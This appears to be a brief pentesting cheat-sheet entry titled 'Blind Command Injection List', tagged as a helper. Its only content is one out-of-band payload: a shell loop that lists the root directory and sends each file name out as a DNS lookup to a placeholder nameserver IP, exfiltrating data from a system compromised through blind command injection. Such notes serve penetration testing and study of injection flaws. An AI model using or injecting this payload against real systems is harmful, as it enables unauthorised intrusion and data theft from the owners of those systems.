# Blind Command Injection List

Search Tag: #helpers #command-injection

## Out-of-Band

```
for file in $(ls /); do host "$file.<dns_nameserver_IP>"; done
```